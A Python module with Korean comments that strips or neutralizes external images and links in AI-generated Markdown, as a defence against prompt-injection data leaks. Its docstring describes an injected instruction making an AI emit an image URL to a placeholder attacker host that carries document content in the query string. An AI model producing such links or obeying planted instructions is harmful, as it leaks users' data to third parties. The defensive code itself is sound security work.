"""AI가 만든 Markdown에서 외부 이미지·링크를 저장·반환 전에 무력화한다.

원문에 숨은 지시(프롬프트 인젝션)로 AI가 `![](https://attacker/x.png?q=<문서 내용>)`를 출력하면,
사용자가 화면을 열기만 해도 브라우저가 그 주소를 요청해 내용이 밖으로 나간다.

- 외부 이미지는 `외부 이미지(host)` 글자로, 외부 링크는 `텍스트 (host)` 글자로 바꾼다.
- 외부 주소는 scheme이 있거나 `//`로 시작하는 주소다. 상대 경로·`#anchor`와 png·jpeg·gif·webp `data:` 이미지는
  외부로 요청을 보내지 않으므로 그대로 둔다(Fruition-document `AiMarkdownSanitizer`와 같은 기준).
- 코드 블록·인라인 코드·평문 URL은 바꾸지 않는다.

markdown-it-py는 인라인 노드의 원문 위치를 주지 않는다. 그래서 파서가 알려 준 인라인 블록 줄 범위 안에서만
링크 문법을 찾아 바꾸고, 다시 파싱해 외부 링크가 남았으면 그 블록의 괄호를 escape해 링크가 되지 못하게 한다.
"""

import re
from urllib.parse import urlsplit

from markdown_it import MarkdownIt
from markdown_it.common.utils import unescapeAll
from markdown_it.token import Token


_PARSER = MarkdownIt("commonmark").enable("table")
_SCHEME = re.compile(r"^[A-Za-z][A-Za-z0-9+.-]*:")
_DATA_IMAGE = re.compile(r"^data:image/(?:png|jpeg|gif|webp)[;,]", re.IGNORECASE)
_INLINE_LINK = re.compile(
    r"(?P<bang>!?)\[(?P<text>(?:[^\[\]\\]|\\.|\[[^\[\]]*\])*)\]"
    r"\(\s*(?P<dest><[^<>\n]*>|[^\s()<>]*(?:\([^\s()]*\)[^\s()<>]*)*)"
    r"(?:\s+(?:\"[^\"]*\"|'[^']*'|\([^()]*\)))?\s*\)"
)
_AUTOLINK = re.compile(r"<(?P<dest>[A-Za-z][A-Za-z0-9+.-]{1,31}:[^\s<>]*|[^\s<>@]+@[^\s<>@]+)>")
_BACKTICKS = re.compile(r"(?<!\\)`+")
_LINES = re.compile(r"[^\r\n]*(?:\r\n|\r|\n)|[^\r\n]+$")
# 바꾼 자리에서 새 링크가 생길 수 있어([![a](x)](y)) 바뀌지 않을 때까지 반복한다.
MAX_SANITIZE_PASSES = 5


def sanitize_ai_markdown(markdown: str, *, keep_urls: frozenset[str] = frozenset()) -> str:
    """keep_urls: 그대로 둘 외부 주소. 편집 결과에서 사용자 원문에 있던 링크를 지키는 데 쓴다(external_urls 결과)."""
    current = markdown
    for _ in range(MAX_SANITIZE_PASSES):
        ranges = _unsafe_line_ranges(current, keep_urls)
        if not ranges:
            return current
        replaced = _replace_in_lines(current, ranges, lambda text: _replace_links(text, keep_urls))
        if replaced == current:
            break
        current = replaced
    # 문법으로 찾지 못한 외부 링크(참조 링크 등)는 그 블록의 괄호를 escape해 링크가 되지 못하게 한다.
    ranges = _unsafe_line_ranges(current, keep_urls)
    return _replace_in_lines(current, ranges, _escape_link_brackets) if ranges else current


def external_urls(markdown: str) -> frozenset[str]:
    return frozenset(
        url
        for token in _PARSER.parse(markdown)
        if token.type == "inline"
        for url in _child_urls(token)
        if _is_external(url)
    )


def external_link_spans(markdown: str) -> list[tuple[int, int]]:
    """외부 이미지·링크 문법의 원문 위치. 문법으로 찾지 못한 외부 링크(참조 링크 등)는 그 블록 전체 위치를 준다."""
    offsets = [0]
    for line in _LINES.findall(markdown):
        offsets.append(offsets[-1] + len(line))
    spans: list[tuple[int, int]] = []
    for start, end in _unsafe_line_ranges(markdown, frozenset()):
        base = offsets[start]
        text = markdown[base:offsets[end]]
        code_spans = _code_spans(text)
        found = [
            (base + match.start(), base + match.end())
            for pattern, replacement in (
                (_INLINE_LINK, _inline_replacement),
                (_AUTOLINK, _autolink_replacement),
            )
            for match in pattern.finditer(text)
            if replacement(match, code_spans, frozenset()) is not None
        ]
        spans.extend(found or [(base, offsets[end])])
    return spans


def _unsafe_line_ranges(markdown: str, keep_urls: frozenset[str]) -> list[tuple[int, int]]:
    ranges = {
        (token.map[0], token.map[1])
        for token in _PARSER.parse(markdown)
        if token.type == "inline"
        and token.map is not None
        and any(_is_external(url) and url not in keep_urls for url in _child_urls(token))
    }
    return sorted(ranges)


def _child_urls(token: Token) -> list[str]:
    urls = []
    for child in token.children or []:
        if child.type == "link_open":
            urls.append(str(child.attrs.get("href", "")))
        elif child.type == "image":
            urls.append(str(child.attrs.get("src", "")))
    return urls


def _replace_in_lines(markdown: str, ranges: list[tuple[int, int]], replace) -> str:
    # markdown-it의 줄 번호와 맞추려고 파서와 같은 줄바꿈(\r\n·\r·\n)으로만 나눈다.
    lines = _LINES.findall(markdown)
    for start, end in reversed(ranges):
        lines[start:end] = [replace("".join(lines[start:end]))]
    return "".join(lines)


def _replace_links(text: str, keep_urls: frozenset[str]) -> str:
    code_spans = _code_spans(text)

    def keep_or(replacement: str | None, match: re.Match[str]) -> str:
        return match.group(0) if replacement is None else replacement

    replaced = _INLINE_LINK.sub(
        lambda match: keep_or(_inline_replacement(match, code_spans, keep_urls), match),
        text,
    )
    if replaced != text:
        # 위치가 바뀌었으므로 autolink는 다음 반복에서 다시 찾는다.
        return replaced
    return _AUTOLINK.sub(
        lambda match: keep_or(_autolink_replacement(match, code_spans, keep_urls), match),
        text,
    )


def _inline_replacement(
    match: re.Match[str],
    code_spans: list[tuple[int, int]],
    keep_urls: frozenset[str],
) -> str | None:
    url = _normalize_destination(match.group("dest"))
    if _in_code(match.start(), code_spans) or not _is_external(url) or url in keep_urls:
        return None
    host = _host(url)
    if match.group("bang"):
        return f"외부 이미지({host})" if host else "외부 이미지"
    label = match.group("text")
    if not label.strip():
        return host
    return f"{label} ({host})" if host else label


def _autolink_replacement(
    match: re.Match[str],
    code_spans: list[tuple[int, int]],
    keep_urls: frozenset[str],
) -> str | None:
    dest = match.group("dest")
    url = _PARSER.normalizeLink(dest if _SCHEME.match(dest) else f"mailto:{dest}")
    if _in_code(match.start(), code_spans) or url in keep_urls:
        return None
    return _host(url) or dest


def _in_code(position: int, code_spans: list[tuple[int, int]]) -> bool:
    return any(start <= position < end for start, end in code_spans)


def _code_spans(text: str) -> list[tuple[int, int]]:
    # 같은 길이의 backtick 묶음끼리 짝지어 인라인 코드 범위를 찾는다(CommonMark code span 규칙).
    runs = list(_BACKTICKS.finditer(text))
    spans = []
    index = 0
    while index < len(runs):
        opening = runs[index]
        closing = next(
            (later for later in runs[index + 1:] if len(later.group(0)) == len(opening.group(0))),
            None,
        )
        if closing is None:
            index += 1
            continue
        spans.append((opening.start(), closing.end()))
        index = runs.index(closing) + 1
    return spans


def _escape_link_brackets(text: str) -> str:
    # 앞의 backslash가 짝수 개면 괄호는 escape되지 않은 상태다.
    return re.sub(r"(?<!\\)((?:\\\\)*)([\[\]<])", r"\1\\\2", text)


def _normalize_destination(raw: str) -> str:
    destination = raw[1:-1] if raw.startswith("<") and raw.endswith(">") else raw
    return _PARSER.normalizeLink(unescapeAll(destination))


def _is_external(url: str) -> bool:
    # 브라우저는 주소의 공백·제어 문자를 무시하고 scheme을 읽는다(java\tscript: 등).
    compact = re.sub(r"[\x00-\x20]", "", url)
    if _DATA_IMAGE.match(compact):
        return False
    return bool(_SCHEME.match(compact)) or compact.startswith("//")


def _host(url: str) -> str:
    try:
        return urlsplit(url).hostname or ""
    except ValueError:
        return ""
